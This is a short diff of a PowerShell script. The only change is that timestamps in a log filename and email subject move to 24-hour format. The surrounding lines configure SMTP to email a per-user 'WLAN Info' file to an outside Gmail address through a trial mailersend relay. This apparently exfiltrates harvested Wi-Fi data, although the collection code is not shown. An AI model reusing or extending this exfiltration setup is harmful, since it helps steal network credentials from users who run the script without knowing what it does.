@@ -1,12 +1,12 @@
 
 # filename
-$logPath = "$env:username"+"_"+"$(get-date -f yyyyMMdd_hhmmss).txt"
+$logPath = "$env:username"+"_"+"$(get-date -f yyyyMMdd_HHmmss).txt"
 
 # SMTP settings
 $From = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
 $To = "it.c0nt1n3ntal@gmail.com"
 $Attachment = $logPath
-$Subject = "WLAN Info " + $(get-date -f yyyyMMdd_hhmmss) 
+$Subject = "WLAN Info " + $(get-date -f yyyyMMdd_HHmmss) 
 $Body = "<h2>WLAN Info!</h2>"
 $Body += "Check the Attachment!"
 $SMTPServer = "smtp.mailersend.net"
